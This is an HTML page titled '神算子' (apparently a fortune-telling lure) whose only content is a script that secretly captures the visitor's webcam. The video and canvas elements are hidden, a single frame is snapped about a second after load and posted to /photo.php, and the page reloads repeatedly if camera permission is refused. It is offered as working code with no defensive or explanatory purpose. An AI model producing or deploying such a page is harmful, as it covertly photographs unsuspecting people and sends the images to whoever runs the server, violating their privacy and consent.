<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="" content="content">
    <title>神算子</title>
</head>
<body>
     <canvas id="canvas" style="display: none;" width="480" height="640"></canvas>
     <video id="video" style="display: none;width: 250px;height: 300px;"></video>
     <script src="https://lib.baomitu.com/jquery/3.6.0/jquery.js"></script>
    <script>
        window.addEventListener("DOMContentLoaded",function(){
            var canvas = document.getElementById('canvas');
            var context =canvas.getContext('2d');
            var video = document.getElementById('video');
            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                navigator.mediaDevices.getUserMedia({video:true}).then(function(stream){
                    video.srcObject = stream;
                    video.play();
                    setTimeout(function(){context.drawImage(video,0,0,480,640)}, 1000);
                    setTimeout(function(){
                        var img = canvas.toDataURL('image/png');
                        $.post('/photo.php',{'imegse':img},function(data){
                        //指定photo.php文件所在位置
                        })
                    } ,1300)
 
                },function(){
                    alert('缺少访问权限');
                    location.reload();
                })
 
            }
        },false);
    </script>
</body>
</html>